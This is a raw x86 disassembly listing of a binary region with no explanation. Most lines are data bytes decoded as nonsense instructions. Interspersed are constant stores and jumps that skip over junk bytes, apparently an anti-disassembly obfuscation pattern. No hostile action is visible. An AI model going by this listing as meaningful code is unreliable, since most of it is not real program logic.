  40b935:	int    0xdf
  40b937:	adc    ebx,edi
  40b939:	idiv   DWORD PTR [ebp+ebx*4-0x5b]
  40b93d:	xchg   ebx,eax
  40b93e:	inc    edx
  40b93f:	(bad)  
  40b940:	sbb    al,0xe2
  40b942:	ja     0x40b944
  40b944:	add    BYTE PTR [ebp-0x14000000],ah
  40b94a:	loope  0x40b930
  40b94c:	adc    BYTE PTR [esi+0xe],bh
  40b94f:	pop    esi
  40b950:	cmp    al,cl
  40b952:	sub    eax,0x6be1e868
  40b957:	or     BYTE PTR [ecx+0x43f94237],cl
  40b95d:	cmp    al,0xed
  40b95f:	aam    0x95
  40b961:	cdq    
  40b962:	lods   eax,DWORD PTR ds:[esi]
  40b963:	enter  0xae03,0xe3
  40b967:	add    edi,DWORD PTR [edx-0x3aa10590]
  40b96d:	std    
  40b96e:	in     al,0xcd
  40b970:	and    DWORD PTR [ebx],ebp
  40b972:	adc    al,0xc4
  40b974:	dec    ebx
  40b975:	jb     0x40b921
  40b977:	lahf   
  40b978:	stos   BYTE PTR es:[edi],al
  40b979:	sahf   
  40b97a:	mov    al,0xfd
  40b97c:	in     al,dx
  40b97d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b97e:	push   esi
  40b97f:	sbb    BYTE PTR [ebp+0x65eea2e9],cl
  40b985:	mov    esi,0xdefd4086
  40b98a:	es leave 
  40b98c:	xchg   ebx,eax
  40b98d:	imul   ah
  40b98f:	ds cld 
  40b991:	inc    edi
  40b992:	xchg   BYTE PTR [edx-0x59a2365f],cl
  40b998:	stc    
  40b999:	jbe    0x40b9a2
  40b99b:	xchg   esi,eax
  40b99c:	lock xor BYTE PTR [eax-0x284d0ee],0xca
  40b9a4:	sub    eax,0x423939b9
  40b9a9:	push   edx
  40b9aa:	and    dl,BYTE PTR [ebx]
  40b9ac:	repnz dec eax
  40b9ae:	call   0xd7d4:0x4405c3ba
  40b9b5:	imul   DWORD PTR [eax]
  40b9b7:	push   edx
  40b9b8:	push   edx
  40b9b9:	int    0xf9
  40b9bb:	sbb    esp,DWORD PTR ds:0xbcf8ea14
  40b9c1:	adc    BYTE PTR [ebx+0x3f04ef81],ah
  40b9c7:	and    al,0x76
  40b9c9:	gs jnp 0x40b9e6
  40b9cc:	cs dec esp
  40b9ce:	mov    ecx,0x90d0c09
  40b9d3:	sti    
  40b9d4:	repnz lods al,BYTE PTR ds:[esi]
  40b9d6:	popa   
  40b9d7:	pusha  
  40b9d8:	add    DWORD PTR [esi-0x6fa79da1],0xffffffc8
  40b9df:	jmp    0x4a47:0x782b7502
  40b9e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9e7:	xchg   esi,eax
  40b9e8:	xchg   esp,eax
  40b9e9:	mov    ah,ah
  40b9eb:	mov    eax,0x935934e
  40b9f0:	cmp    edi,0xe9c83bff
  40b9f6:	mov    ebp,0xbd000000
  40b9fb:	inc    ebx
  40b9fc:	ins    BYTE PTR es:[edi],dx
  40b9fd:	sar    dh,cl
  40b9ff:	(bad)  
  40ba00:	mov    edi,0xd13eac6f
  40ba05:	imul   ebp,DWORD PTR [ebx-0x78cc344b],0xa5000078
  40ba0f:	add    BYTE PTR [eax],al
  40ba11:	add    dl,al
  40ba13:	vmread DWORD PTR [esi-0x294ebb5d],ebp
  40ba1a:	push   edx
  40ba1b:	test   eax,0xb689d3e2
  40ba20:	repnz mov esi,0x7547ff8a
  40ba26:	add    DWORD PTR ds:0xc3a146e7,ebx
  40ba2c:	add    al,0x10
  40ba2e:	xchg   ebx,eax
  40ba2f:	loop   0x40ba12
  40ba31:	paddb  mm6,QWORD PTR [esi]
  40ba34:	out    0x5f,eax
  40ba36:	pushf  
  40ba37:	or     eax,0x2fa269ff
  40ba3c:	xchg   ebx,eax
  40ba3d:	aas    
  40ba3e:	cli    
  40ba3f:	xchg   ecx,eax
  40ba40:	(bad)  
  40ba41:	xlat   BYTE PTR ds:[ebx]
  40ba42:	mov    edx,0xe8262cc9
  40ba47:	jecxz  0x40ba9f
  40ba49:	sar    ch,1
  40ba4b:	shr    DWORD PTR [edx],1
  40ba4d:	into   
  40ba4e:	ins    DWORD PTR es:[edi],dx
  40ba4f:	and    al,0x10
  40ba51:	jae    0x40ba02
  40ba53:	repz iret 
  40ba55:	lds    ecx,FWORD PTR [edi+0x29]
  40ba58:	jmp    0x8b16ea9c
  40ba5d:	push   eax
  40ba5e:	retf   
  40ba5f:	stos   BYTE PTR es:[edi],al
  40ba60:	ins    DWORD PTR es:[edi],dx
  40ba61:	jmp    0x40bace
  40ba63:	sbb    DWORD PTR [esi-0x70],esp
  40ba66:	cmp    esi,DWORD PTR [ebx+0x41f0b079]
  40ba6c:	xchg   edi,eax
  40ba6d:	outs   dx,BYTE PTR ds:[esi]
  40ba6e:	pop    ds
  40ba6f:	dec    edx
  40ba70:	shr    BYTE PTR [edi+0x7],0xee
  40ba74:	inc    esp
  40ba75:	and    al,0xa7
  40ba77:	inc    eax
  40ba78:	or     BYTE PTR [ecx],0x4c
  40ba7b:	int    0x8c
  40ba7d:	(bad)  
  40ba7e:	push   ebx
  40ba7f:	or     ch,BYTE PTR [edi]
  40ba81:	mov    bh,0xf2
  40ba83:	pop    edx
  40ba84:	pop    DWORD PTR [eax+0x4ebaa11e]
  40ba8a:	fldcw  WORD PTR [edx-0x7d]
  40ba8d:	or     DWORD PTR [ebp+0x11c3acc0],0x1
  40ba94:	xchg   DWORD PTR [edx],esp
  40ba96:	test   DWORD PTR [edi+esi*2],edi
  40ba99:	adc    al,0xf0
  40ba9b:	xchg   esp,eax
  40ba9c:	cwde   
  40ba9d:	fld    TBYTE PTR [esi+esi*8-0x13]
  40baa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baa2:	test   DWORD PTR [ebp-0x15d335a1],eax
  40baa8:	cmp    DWORD PTR [ecx-0x4c4a0de6],esi
  40baae:	imul   esp,DWORD PTR [edx-0x4a1a13ca],0x3
  40bab5:	or     DWORD PTR ds:0xf575820f,ebp
  40babb:	(bad)  
  40babc:	(bad)  
  40babd:	jmp    0x40bb7f
  40bac2:	scas   eax,DWORD PTR es:[edi]
  40bac3:	or     ah,ch
  40bac5:	iret   
  40bac6:	in     eax,0xef
  40bac8:	scas   eax,DWORD PTR es:[edi]
  40bac9:	push   0x9
  40bacb:	dec    ebp
  40bacc:	mov    ch,0xbb
  40bace:	mov    ah,0x4f
  40bad0:	mov    dh,0x1c
  40bad2:	sub    al,0x79
  40bad4:	add    BYTE PTR [eax],al
  40bad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bad7:	add    BYTE PTR [eax],al
  40bad9:	add    BYTE PTR [eax-0x7b70cd61],ah
  40badf:	pop    es
  40bae0:	pop    edi
  40bae1:	popw   es
  40bae3:	add    DWORD PTR [esp+ebx*8],eax
  40bae6:	or     ch,BYTE PTR ds:0x5c354313
  40baec:	or     al,0xf5
  40baee:	inc    edx
  40baef:	xchg   edi,eax
  40baf0:	push   ds
  40baf1:	and    esp,DWORD PTR [ebp+0x51]
  40baf4:	stc    
  40baf5:	xchg   ecx,eax
  40baf6:	xor    esi,DWORD PTR ds:[esi]
  40baf9:	push   cs
  40bafa:	mov    edx,0x50b5e2a4
  40baff:	ret    0xfbfd
  40bb02:	xchg   ebp,eax
  40bb03:	mov    DWORD PTR [ebp+0x6b6014b8],ecx
  40bb09:	dec    esp
  40bb0a:	mov    bl,ch
  40bb0c:	mov    dl,0x94
  40bb0e:	xchg   ebx,eax
  40bb0f:	jmp    0x5d5875ad
  40bb14:	stc    
  40bb15:	push   eax
  40bb16:	mov    ebx,edi
  40bb18:	shr    BYTE PTR [edx+0x2f42f84d],cl
  40bb1e:	add    DWORD PTR [esi-0x69236ea9],0x439e0134
  40bb28:	mov    eax,ds:0xcf3ae073
  40bb2d:	imul   dl
  40bb2f:	mov    edx,0x8540e5c0
  40bb34:	pop    edx
  40bb35:	and    al,0x20
  40bb37:	mov    ds,WORD PTR [ecx]
  40bb39:	add    BYTE PTR [esi+0x36],cl
  40bb3c:	fdiv   st,st(2)
  40bb3e:	mov    edx,0x5fa70f9a
  40bb43:	inc    eax
  40bb44:	push   ebx
  40bb45:	xchg   ebx,eax
  40bb46:	pop    ebp
  40bb47:	pop    ecx
  40bb48:	lahf   
  40bb49:	adc    DWORD PTR [edi-0x26c1d18b],ecx
  40bb4f:	sahf   
  40bb50:	mov    ss,WORD PTR [ecx+0x7e]
  40bb53:	dec    eax
  40bb54:	inc    esp
  40bb55:	ss ins DWORD PTR es:[edi],dx
  40bb57:	scas   al,BYTE PTR es:[edi]
  40bb58:	or     cl,0x5d
  40bb5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb5c:	mov    bh,0x73
  40bb5e:	or     eax,0xe1a757bf
  40bb63:	call   0x8910a618
  40bb68:	icebp  
  40bb69:	in     eax,0x8b
  40bb6b:	ficom  WORD PTR [eax]
  40bb6d:	push   edi
  40bb6e:	sub    al,0x8e
  40bb70:	sbb    al,0xd2
  40bb72:	pushf  
  40bb73:	mov    ecx,0x4f4ed543
  40bb78:	add    edx,DWORD PTR [ebx+ecx*2]
  40bb7b:	and    DWORD PTR [ebp+0x45c768d2],edx
  40bb81:	or     bh,cl
  40bb83:	xor    DWORD PTR [eax],eax
  40bb85:	add    BYTE PTR [ecx+0x45c7cc75],cl
  40bb8b:	rcl    BYTE PTR [esi+ebp*2],1
  40bb8e:	add    BYTE PTR [eax],al
  40bb90:	jmp    0x40bc52
  40bb95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb96:	(bad)  
  40bb98:	fcmovnbe st,st(7)
  40bb9a:	sti    
  40bb9b:	scas   eax,DWORD PTR es:[edi]
  40bb9c:	jle    0x40bbc4
  40bb9e:	sub    ecx,esp
  40bba0:	sbb    al,0xa3
  40bba2:	lods   eax,DWORD PTR ds:[esi]
  40bba3:	mov    dh,0x65
  40bba5:	sar    DWORD PTR [ecx+0x0],1
  40bba8:	add    BYTE PTR [ebp+0x22000000],ah
  40bbae:	cs push ss
  40bbb0:	ss jecxz 0x40bb40
  40bbb3:	adc    eax,0xb5df69ee
  40bbb8:	fwait
  40bbb9:	daa    
  40bbba:	jo     0x40bbae
  40bbbc:	daa    
  40bbbd:	xchg   ebp,eax
  40bbbe:	sahf   
  40bbbf:	sub    DWORD PTR [eax+0x6e],0xffffff90
  40bbc3:	jmp    0xd541:0x52da4a89
  40bbca:	sbb    al,0xcb
  40bbcc:	test   al,0x7
  40bbce:	push   edx
  40bbcf:	mov    ds:0x1148848b,al
  40bbd4:	stos   BYTE PTR es:[edi],al
  40bbd5:	inc    edx
  40bbd6:	ret    0xf004
  40bbd9:	in     eax,dx
  40bbda:	cdq    
  40bbdb:	lahf   
  40bbdc:	std    
  40bbdd:	jb     0x40bb89
  40bbdf:	ins    DWORD PTR es:[edi],dx
  40bbe0:	dec    edx
  40bbe1:	cld    
  40bbe2:	push   edi
  40bbe3:	out    0xeb,al
  40bbe5:	mov    eax,ds:0x39377322
  40bbea:	in     eax,dx
  40bbeb:	sbb    DWORD PTR [ecx-0x3cb8f6d9],ebp
  40bbf1:	push   ds
  40bbf2:	neg    esi
  40bbf4:	push   edi
  40bbf5:	ror    DWORD PTR [eax-0x42],cl
  40bbf8:	in     al,dx
  40bbf9:	retf   
  40bbfa:	nop
  40bbfb:	push   ss
  40bbfc:	ds xchg esp,eax
  40bbfe:	adc    ebx,DWORD PTR [ebp-0x4c]
  40bc01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc02:	pop    ebx
  40bc03:	mov    BYTE PTR cs:[ebx+esi*1],al
  40bc07:	pop    es
  40bc08:	mov    al,ds:0xed45c10b
  40bc0d:	add    BYTE PTR [ecx+0x1beb0005],dl
  40bc13:	pop    edi
  40bc14:	retf   
  40bc15:	outs   dx,DWORD PTR gs:[si]
  40bc18:	sti    
  40bc19:	jb     0x40bbb8
  40bc1b:	sbb    eax,0x30e5f410
  40bc20:	cmc    
  40bc21:	repz retf 
  40bc23:	loopne 0x40bc7f
  40bc25:	push   ebp
  40bc26:	out    dx,eax
  40bc27:	outs   dx,DWORD PTR ds:[esi]
  40bc28:	pop    ss
  40bc29:	ja     0x40bc01
  40bc2b:	or     DWORD PTR [edx+0x13db7bd5],eax
  40bc31:	inc    eax
  40bc32:	xchg   ecx,eax
  40bc33:	test   DWORD PTR [ebx*2+0x742a5a79],esp
  40bc3a:	ret    0xd136
  40bc3d:	inc    ecx
  40bc3e:	fcomp  QWORD PTR [eax]
  40bc40:	inc    esi
  40bc41:	fdivr  QWORD PTR [esi+0x392f0ac5]
  40bc47:	popa   
  40bc48:	imul   edx,DWORD PTR [edi+0x7b0ac695],0x8fc7cf83
  40bc52:	mov    DWORD PTR [ebp-0x2c],0x4828
  40bc59:	mov    DWORD PTR [ebp-0x28],0x279d
  40bc60:	mov    DWORD PTR [ebp-0x4],0x5887
  40bc67:	mov    DWORD PTR [ebp-0x8],0x61c0
  40bc6e:	mov    DWORD PTR [ebp-0xc],0x3d96
  40bc75:	mov    ecx,DWORD PTR [ebp+0x8]
  40bc78:	jmp    0x40bd3a
  40bc7d:	mov    edx,ecx
  40bc7f:	mov    dl,BYTE PTR [esi-0x20622935]
  40bc85:	shl    BYTE PTR [esi],cl
  40bc87:	mov    ch,0x3f
  40bc89:	push   ecx
  40bc8a:	outs   dx,BYTE PTR ds:[esi]
  40bc8b:	or     al,bl
  40bc8d:	jbe    0x40bd09
  40bc8f:	add    BYTE PTR [eax],al
  40bc91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc92:	add    BYTE PTR [eax],al
  40bc94:	add    dl,al
  40bc96:	test   DWORD PTR [eax+0x50],esp
  40bc99:	xchg   ecx,eax
  40bc9a:	cmp    DWORD PTR [ebp+0xc974776],edx
  40bca0:	test   eax,0x1206efa0
  40bca5:	or     dl,al
  40bca7:	mov    ecx,0x78441985
  40bcac:	jnp    0x40bd1c
  40bcae:	rcl    ebp,1
  40bcb0:	inc    eax
  40bcb1:	jne    0x40bc77
  40bcb3:	cwde   
  40bcb4:	ret    
  40bcb5:	add    esi,DWORD PTR [ebx]
  40bcb7:	sbb    eax,0x4900ecd7
  40bcbc:	cld    
  40bcbd:	(bad)  
  40bcbe:	xchg   esi,eax
  40bcbf:	add    DWORD PTR [eax-0x61],ebx
  40bcc2:	sbb    al,0xfb
  40bcc4:	and    DWORD PTR [edi-0x4c71c88d],ebp
  40bcca:	mov    eax,ds:0x4e94d186
  40bccf:	adc    esi,DWORD PTR [ecx]
  40bcd1:	jl     0x40bc61
  40bcd3:	inc    ebx
  40bcd4:	cwde   
  40bcd5:	mov    bl,0x35
  40bcd7:	push   ebp
  40bcd8:	clc    
  40bcd9:	loop   0x40bd0b
  40bcdb:	dec    esp
  40bcdc:	ret    0xca04
  40bcdf:	pop    esi
  40bce0:	js     0x40bc9e
  40bce2:	jbe    0x40bcbc
  40bce4:	test   DWORD PTR [ecx+0x1561f747],0xc95b163a
  40bcee:	stos   DWORD PTR es:[edi],eax
  40bcef:	jno    0x40bca1
  40bcf1:	in     eax,dx
  40bcf2:	mov    edi,0x2acd6b0a
  40bcf7:	(bad)  
  40bcf9:	in     al,dx
  40bcfa:	repz test al,0xb6
  40bcfd:	cwde   
  40bcfe:	sbb    BYTE PTR [esi+0x64ecb01a],ah
  40bd04:	loop   0x40bcd6
  40bd06:	sahf   
  40bd07:	sbb    ah,BYTE PTR [edx+0x4cc673bc]
  40bd0d:	cs nop
  40bd0f:	ficom  DWORD PTR [eax+0x69]
  40bd12:	mov    eax,ds:0xfca8a324
  40bd17:	mov    ecx,0xb31646d2
  40bd1c:	mov    ss,WORD PTR [esi+edx*4]
  40bd1f:	out    0x85,al
  40bd21:	xchg   DWORD PTR [ebx],edi
  40bd23:	leave  
  40bd24:	retf   0x1c56
  40bd27:	sub    BYTE PTR [ebp+eiz*1-0x371dd915],al
  40bd2e:	lods   eax,DWORD PTR ds:[esi]
  40bd2f:	inc    DWORD PTR [eax]
  40bd31:	inc    esp
  40bd32:	push   ebx
  40bd33:	push   esp
  40bd34:	les    ebp,FWORD PTR [edx+0x6]
  40bd37:	stc    
  40bd38:	dec    ebp
  40bd39:	ds or  ecx,0x4c79
  40bd40:	sub    ecx,0x2e31
  40bd46:	imul   ecx,ecx,0x6a76
  40bd4c:	pop    edi
  40bd4d:	xor    ecx,0x21303a60
  40bd53:	pop    ebx
  40bd54:	mov    DWORD PTR [ebp-0x20],0x6e1c
  40bd5b:	mov    DWORD PTR [ebp-0x24],0x47ff
  40bd62:	jmp    0x40be24
  40bd67:	and    BYTE PTR [esi-0x3519751a],0xec
  40bd6e:	scas   al,BYTE PTR es:[edi]
  40bd6f:	repnz rcr BYTE PTR [edi],0xbf
  40bd73:	ret    0x144b
  40bd76:	sbb    edi,DWORD PTR gs:[ebx+0x0]
  40bd7a:	add    BYTE PTR [ebp+0x4c000000],ah
  40bd80:	aam    0x7
  40bd82:	in     eax,0xf8
  40bd84:	daa    
  40bd85:	or     DWORD PTR [eax+edx*2+0x75],ebx
  40bd89:	fsubr  QWORD PTR [esi+0x49]
  40bd8c:	test   al,0x2e
  40bd8e:	inc    esi
  40bd8f:	jecxz  0x40bdf9
  40bd91:	call   0x4e980f9d
  40bd96:	ds ret 0x8429
  40bd9a:	adc    al,0xa1
  40bd9c:	sbb    eax,0xc6f8b1f2
  40bda1:	loop   0x40bd5b
  40bda3:	push   ecx
  40bda4:	dec    ecx
  40bda5:	sbb    al,0xef
  40bda7:	sub    al,0x82
  40bda9:	jno    0x40bd97
  40bdab:	pusha  
  40bdac:	(bad)  
  40bdad:	dec    eax
  40bdae:	or     BYTE PTR [esi],dh
  40bdb0:	jns    0x40bd7c
  40bdb2:	fcom   DWORD PTR [ebp-0x51]
  40bdb5:	inc    edx
  40bdb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdb7:	sbb    dl,al
  40bdb9:	into   
  40bdba:	adc    ebx,ebx
  40bdbc:	xchg   esi,eax
  40bdbd:	push   esp
  40bdbe:	test   DWORD PTR [ecx+0x6d],ebx
  40bdc1:	sbb    eax,0x1f6a855c
  40bdc6:	loop   0x40bd69
  40bdc8:	inc    eax
  40bdc9:	pop    edx
  40bdca:	jo     0x40be0d
  40bdcc:	mov    ah,0x94
  40bdce:	cmp    ch,BYTE PTR [ecx-0xcc21e41]
  40bdd4:	int    0x28
  40bdd6:	add    al,0xc4
  40bdd8:	inc    eax
  40bdd9:	jno    0x40be5a
  40bddb:	cmp    DWORD PTR [ebx+0x4e73621],eax
  40bde1:	aad    0x43
  40bde3:	push   ebx
  40bde4:	mov    ds:0x211dc5f0,al
  40bde9:	test   bh,ch
  40bdeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdec:	xchg   edi,eax
  40bded:	in     eax,dx
  40bdee:	imul   ecx,edx,0x7710884c
  40bdf4:	sbb    al,0xc6
  40bdf6:	inc    esp
  40bdf7:	dec    ebp
  40bdf8:	imul   edi,DWORD PTR [ebx-0x55],0xffffffa7
  40bdfc:	xor    al,0x90
  40bdfe:	xchg   edx,eax
  40bdff:	add    DWORD PTR [esi],ebx
  40be01:	stos   BYTE PTR es:[edi],al
  40be02:	sbb    bh,ch
  40be04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be05:	ss test ebp,esi
  40be08:	xchg   esp,eax
  40be09:	daa    
  40be0a:	inc    edx
  40be0b:	sar    eax,1
  40be0d:	fisttp DWORD PTR [ebx]
  40be0f:	loop   0x40be7a
  40be11:	mov    esp,0x84956ddf
  40be16:	sbb    eax,0xdcdd65a1
  40be1b:	mov    al,ds:0xaa266cac
  40be20:	fsubr  DWORD PTR [ebx]
  40be22:	pop    ecx
  40be23:	inc    eax
  40be24:	mov    DWORD PTR [ebp+0x8],0x7934
  40be2b:	jmp    0x40beed
  40be30:	dec    ebx
  40be31:	pop    ebx
  40be32:	inc    esi
  40be33:	jae    0x40be8b
  40be35:	jg     0x40beb6
  40be37:	jnp    0x40be8a
  40be39:	stos   BYTE PTR es:[edi],al
  40be3a:	mov    ecx,0x40974174
  40be3f:	pop    edi
  40be40:	sar    BYTE PTR [ebx+0x0],0x0
  40be44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be45:	add    BYTE PTR [eax],al
  40be47:	add    BYTE PTR [ebp-0x69],ch
  40be4a:	cmp    bl,BYTE PTR [esp+ecx*8]
  40be4d:	(bad)  
  40be4e:	bound  ebp,QWORD PTR [eax]
  40be50:	sub    eax,eax
  40be52:	and    dh,BYTE PTR [edx]
  40be54:	push   edi
  40be55:	xchg   ecx,eax
  40be56:	cmp    BYTE PTR [ebx-0x518c7ab9],bh
  40be5c:	push   es
  40be5d:	repz xchg ebp,eax
  40be5f:	ja     0x40be65
  40be61:	mov    bl,0x95
  40be63:	ror    DWORD PTR [edi-0x21e84de6],0xd7
  40be6a:	mov    ds:0xb38771a7,al
  40be6f:	add    ebp,edi
  40be71:	push   ss
  40be72:	ss and al,0x2
  40be75:	jmp    DWORD PTR [eax-0x13]
  40be78:	mov    bl,0x64
  40be7a:	popf   
  40be7b:	ror    DWORD PTR [esi*1+0x37de5811],1
  40be82:	push   ss
  40be83:	pusha  
  40be84:	xor    DWORD PTR [ebx+0x67],0x20
  40be88:	pop    es
  40be89:	push   es
  40be8a:	pop    esp
  40be8b:	cmc    
  40be8c:	cmp    bh,BYTE PTR [esi-0x4]
  40be8f:	adc    eax,ecx
  40be91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be92:	es sbb ebp,DWORD PTR ss:[ecx]
  40be96:	cs cli 
  40be98:	mov    bl,0x46
  40be9a:	jno    0x40be5a
  40be9c:	and    eax,0x5309a180
  40bea1:	and    eax,0xfcc79eef
  40bea6:	push   esp
  40bea7:	add    eax,0x1d07f79c
  40beac:	test   ah,al
  40beae:	stc    
  40beaf:	pop    ebp
  40beb0:	add    dh,BYTE PTR [eax+0x45]
  40beb3:	test   al,0x86
  40beb5:	shl    ah,0x21
  40beb8:	jp     0x40be99
  40beba:	add    BYTE PTR [ebx],al
  40bebc:	sti    
  40bebd:	jb     0x40bf12
  40bebf:	std    
  40bec0:	xor    al,0x47
  40bec2:	dec    eax
  40bec3:	pushf  
  40bec4:	enter  0x1011,0x2f
  40bec8:	fidiv  DWORD PTR [ebx]
  40beca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40becb:	lods   eax,DWORD PTR ds:[esi]
  40becc:	xchg   edi,eax
  40becd:	jbe    0x40be54
  40becf:	pop    ecx
  40bed0:	xor    eax,0x16d9cbd5
  40bed5:	out    0x98,al
  40bed7:	mov    esi,DWORD PTR [edx+0xdf3258f]
  40bedd:	iret   
  40bede:	add    esi,esp
  40bee0:	inc    sp
  40bee2:	add    edx,DWORD PTR [esi+0x58]
  40bee5:	sbb    BYTE PTR ds:0x8f7cf283,dl
  40beeb:	int    0x6
  40beed:	mov    DWORD PTR [ebp-0x10],0x7ec1
  40bef4:	mov    DWORD PTR [ebp-0x14],0x2110
  40befb:	jmp    0x40bfbd
  40bf00:	shl    DWORD PTR [edx+0xe],0x88
  40bf04:	mov    edi,0x377bc7fc
  40bf09:	in     eax,dx
  40bf0a:	loope  0x40beea
  40bf0c:	cmp    bh,BYTE PTR [esi]
  40bf0e:	repnz pop edi
  40bf10:	gs jl  0x40bf13
  40bf13:	add    BYTE PTR [ebp+0x5e000000],ah
  40bf19:	xchg   ecx,eax
  40bf1a:	aam    0x93
  40bf1c:	je     0x40bf26
  40bf1e:	data16 mov cs,WORD PTR [ecx+0x7b]
  40bf22:	stc    
  40bf23:	or     DWORD PTR [eax],esp
  40bf25:	add    BYTE PTR [ebx+0x2b],bh
  40bf28:	fsqrt  
  40bf2a:	outs   dx,BYTE PTR ds:[esi]
  40bf2b:	add    ah,cl
  40bf2d:	clc    
  40bf2e:	jne    0x40bf5b
  40bf30:	(bad)  
  40bf31:	xor    DWORD PTR [ebp+0x35ae3557],edi
  40bf37:	addr16 das 
  40bf39:	popa   
  40bf3a:	data16 out 0x45,al
  40bf3d:	in     eax,dx
  40bf3e:	loope  0x40bf91
  40bf40:	push   ecx
  40bf41:	mov    cs,WORD PTR es:[eax+0x5eddce91]
  40bf48:	and    al,0x96
  40bf4a:	mov    esp,0xc7f7b205
  40bf4f:	jae    0x40bfd0
  40bf51:	dec    edi
  40bf52:	sbb    BYTE PTR [edi+0x31fa8ef3],bl
  40bf58:	rol    DWORD PTR [edx-0x1],cl
  40bf5b:	pop    ds
  40bf5c:	inc    ebp
  40bf5d:	dec    edi
  40bf5e:	push   esi
  40bf5f:	enter  0x913d,0x1
  40bf63:	dec    ebx
  40bf64:	mov    al,0x16
  40bf66:	jle    0x40bf8a
  40bf68:	fs in  al,dx
  40bf6a:	std    
  40bf6b:	clc    
  40bf6c:	xor    BYTE PTR [eax-0xac3397],dh
  40bf72:	(bad)  
  40bf73:	mov    cl,0x11
  40bf75:	xor    al,0xce
  40bf77:	push   cs
  40bf78:	inc    edi
  40bf79:	test   ecx,esp
  40bf7b:	or     ch,ah
  40bf7d:	popa   
  40bf7e:	jo     0x40bf36
  40bf80:	xlat   BYTE PTR ds:[ebx]
  40bf81:	mov    eax,esi
  40bf83:	adc    al,BYTE PTR [edi-0x7b19a560]
  40bf89:	repz jmp 0x40bfef
  40bf8c:	(bad)  
  40bf8e:	and    al,0x84
  40bf90:	test   al,0x8b
  40bf92:	inc    esi
  40bf93:	jae    0x40bf41
  40bf95:	inc    si
  40bf97:	repz mov edx,0x7738c270
  40bf9d:	pop    esi
  40bf9e:	test   al,0xb7
  40bfa0:	call   0x4b62ff82
  40bfa5:	(bad)  
  40bfa6:	xor    al,0xd3
  40bfa8:	mov    eax,ds:0x2df6df1e
  40bfad:	xor    bh,BYTE PTR [ebx+edi*1-0x12]
  40bfb1:	cmp    BYTE PTR [ebp+0x6e],dl
  40bfb4:	(bad)  
  40bfb5:	in     al,0x55
  40bfb7:	sbb    BYTE PTR [edx+0x21],al
  40bfba:	fnstcw WORD PTR [ecx-0x17ba386c]
  40bfc0:	sub    eax,0xc7000060
  40bfc5:	inc    ebp
  40bfc6:	in     al,0xe0
  40bfc8:	outs   dx,BYTE PTR ds:[esi]
  40bfc9:	add    BYTE PTR [eax],al
  40bfcb:	jmp    0x40c08d
  40bfd0:	inc    edi
  40bfd1:	cmp    DWORD PTR [edi-0x102900ba],ebp
  40bfd7:	cmp    ebx,edx
  40bfd9:	aaa    
  40bfda:	push   edi
  40bfdb:	ret    
  40bfdc:	rcr    DWORD PTR [eax],0x4e
  40bfdf:	cmp    BYTE PTR [edx],cl
  40bfe1:	jge    0x40bfe3
  40bfe3:	add    BYTE PTR [ebp-0x6000000],ah
  40bfe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfea:	ins    DWORD PTR es:[edi],dx
  40bfeb:	dec    edx
  40bfec:	xor    eax,0xc6198595
  40bff1:	bswap  ebx
  40bff3:	dec    edx
  40bff4:	pusha  
  40bff5:	fild   WORD PTR [edi]
  40bff7:	retf   0xbd2b
  40bffa:	add    bl,BYTE PTR [edi+0x20e0a391]
  40c000:	sbb    edx,DWORD PTR [esi]
  40c002:	iret   
  40c003:	add    eax,0x71d5516f
  40c008:	jge    0x40c014
  40c00a:	sar    DWORD PTR [edx+0x7],1
  40c00d:	(bad)  
  40c00e:	cmc    
  40c00f:	jmp    0x639925ae
  40c014:	popa   
  40c015:	mov    dh,ah
  40c017:	retf   
  40c018:	xor    al,0xfc
  40c01a:	jmp    0xc5892025
  40c01f:	fs jl  0x40c01b
  40c022:	sbb    al,0x1d
  40c024:	dec    edx
  40c025:	jne    0x40c02a
  40c027:	bound  esp,QWORD PTR [edx-0x6c]
  40c02a:	mov    WORD PTR [esi-0x43],cs
  40c02d:	outs   dx,BYTE PTR ds:[esi]
  40c02e:	lock rsm 
  40c031:	xchg   esp,eax
  40c032:	dec    esi
  40c033:	fstp   TBYTE PTR [eax+0x16b8514b]
  40c039:	ja     0x40c076
  40c03b:	sahf   
  40c03c:	pop    edx
  40c03d:	mov    ds:0x67b2a51,al
  40c042:	inc    esp
  40c043:	std    
  40c044:	test   DWORD PTR [ecx-0x6f],edi
  40c047:	jo     0x40c01b
  40c049:	xchg   esp,ebp
  40c04b:	bound  esp,QWORD PTR [esi+0x2d]
  40c04e:	jle    0x40c053
  40c050:	inc    ecx
  40c051:	and    dh,0xb6
  40c054:	imul   esp,esi,0xfffffff3
  40c057:	mov    al,0x3a
  40c059:	jge    0x40c014
  40c05b:	das    
  40c05c:	mov    ah,0xca
  40c05e:	xchg   ecx,eax
  40c05f:	xchg   edx,eax
  40c060:	dec    esp
  40c061:	jbe    0x40c095
  40c063:	mov    esi,0x19696219
  40c068:	es mov dh,0x44
  40c06b:	cmp    bh,0x1a
  40c06e:	xchg   ebx,esi
  40c070:	or     ah,ah
  40c072:	sbb    ebp,DWORD PTR [edi-0x1b82af32]
  40c078:	dec    esp
  40c079:	jg     0x40c040
  40c07b:	adc    DWORD PTR [ebp+eiz*1-0x4e2591db],ebx
  40c082:	lds    ebx,FWORD PTR [ebp+eax*2+0x34]
  40c086:	dec    eax
  40c087:	xor    edx,DWORD PTR [edi+0x12aebe38]
  40c08d:	mov    eax,DWORD PTR [ebp+0x8]
  40c090:	add    eax,DWORD PTR [ebp-0x24]
  40c093:	mov    edx,DWORD PTR [ebp-0x20]
  40c096:	or     eax,0x4d6f
  40c09b:	and    eax,edx
  40c09d:	jmp    0x40c15f
  40c0a2:	scas   al,BYTE PTR es:[edi]
  40c0a3:	std    
